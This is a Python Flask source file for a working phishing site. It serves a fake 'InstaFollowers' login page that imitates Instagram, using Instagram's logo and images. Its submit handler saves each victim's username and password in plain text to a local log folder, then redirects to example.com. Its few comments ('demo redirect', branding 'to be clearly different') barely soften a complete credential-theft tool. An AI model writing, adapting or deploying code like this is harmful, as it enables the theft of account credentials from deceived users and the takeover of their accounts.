from flask import Flask, request, render_template_string, redirect
import os
from datetime import datetime

app = Flask(__name__)

# Save captured data in a folder renamed to InstaFollowers Logs
SAVE_FOLDER = os.path.expanduser('~/storage/downloads/InstaFollowers Logs')
os.makedirs(SAVE_FOLDER, exist_ok=True)

@app.route('/')
def homepage():
    html = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>InstaFollowers</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
        <style>
            /* Base Styling for Light Mode */
            body {
                margin: 0;
                padding: 0;
                font-family: 'Roboto', sans-serif;
                background-color: #fafafa;
                color: #262626;
            }
            .main-wrapper {
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            .phone-preview {
                background-image: url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png');
                background-size: contain;
                background-repeat: no-repeat;
                width: 380px;
                height: 581px;
                display: none;
            }
            .login-box {
                width: 350px;
                padding: 40px 40px 20px;
                border: 1px solid #dbdbdb;
                background-color: #fff;
                text-align: center;
            }
            .login-box img {
                margin-bottom: 35px;
            }
            input {
                width: 100%;
                padding: 10px;
                margin-bottom: 8px;
                font-size: 14px;
                background: #fafafa;
                border: 1px solid #dbdbdb;
                border-radius: 3px;
            }
            button {
                background-color: #3897f0;
                color: white;
                width: 100%;
                padding: 8px;
                font-weight: bold;
                border: none;
                border-radius: 4px;
                font-size: 14px;
                margin-top: 10px;
                cursor: pointer;
            }
            .footer-box {
                width: 350px;
                text-align: center;
                border: 1px solid #dbdbdb;
                margin-top: 10px;
                background: #fff;
                padding: 20px;
                font-size: 14px;
            }
            .footer-box a {
                color: #3897f0;
                text-decoration: none;
                font-weight: bold;
            }
            @media(min-width: 768px) {
                .main-wrapper {
                    flex-direction: row;
                }
                .phone-preview {
                    display: block;
                    margin-right: 50px;
                }
            }
            /* Dark Mode Overrides */
            @media (prefers-color-scheme: dark) {
                body {
                    background-color: #000;
                    color: #fafafa;
                }
                .login-box, .footer-box {
                    background-color: #1c1c1c;
                    border: 1px solid #333;
                }
                input {
                    background: #262626;
                    border: 1px solid #444;
                    color: #fff;
                }
                button {
                    background-color: #3897f0;
                    color: #fff;
                }
                .footer-box a {
                    color: #3897f0;
                }
            }
        </style>
    </head>
    <body>
        <div class="main-wrapper">
            <div class="phone-preview"></div>
            <div>
                <div class="login-box">
                    <!-- Replace the Instagram logo with a simple InstaFollowers branding (using the same image for consistency)
                         Note: To be clearly different, the alt text and page title have been updated -->
                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" 
                         width="175" alt="InstaFollowers Logo">
                    <form action="/submit" method="POST">
                        <input type="text" name="user" placeholder="Phone number, username, or email" required>
                        <input type="password" name="pass" placeholder="Password" required>
                        <button type="submit">Log In</button>
                    </form>
                </div>
                <div class="footer-box">
                    Don't have an account? <a href="#">Sign up</a>
                </div>
            </div>
        </div>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/submit', methods=['POST'])
def submit():
    user = request.form.get('user')
    passwd = request.form.get('pass')

    filename = f"{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
    path = os.path.join(SAVE_FOLDER, filename)
    with open(path, 'w') as f:
        f.write(f"User: {user}\nPass: {passwd}\nTime: {datetime.now()}\n")

    # Demo redirect to a neutral site
    return redirect("https://example.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7777)

